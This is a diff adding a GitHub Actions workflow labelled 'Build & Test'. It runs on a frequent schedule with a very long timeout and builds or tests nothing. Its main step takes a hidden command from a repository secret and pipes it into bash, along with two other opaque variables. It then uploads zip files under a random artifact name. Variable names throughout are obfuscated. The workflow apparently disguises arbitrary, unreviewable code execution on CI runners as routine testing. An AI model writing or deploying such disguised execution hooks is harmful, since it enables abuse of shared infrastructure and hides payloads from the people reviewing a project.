@@ -1,0 +1,29 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 5,11,17,23 * * *'
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          br1217: ${{ secrets.br1217 }}
+        run: |
+          printf '%s' "$br1217" | jq -r .ham03 | /bin/bash
+          printf '%s' "$jqkea38" | jq -r .lzmf14449 | /bin/bash
+          echo $lsw73121 | jq -r .llhi0 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: TxPuRsp0
+          path: "*.zip"
+          retention-days: 1
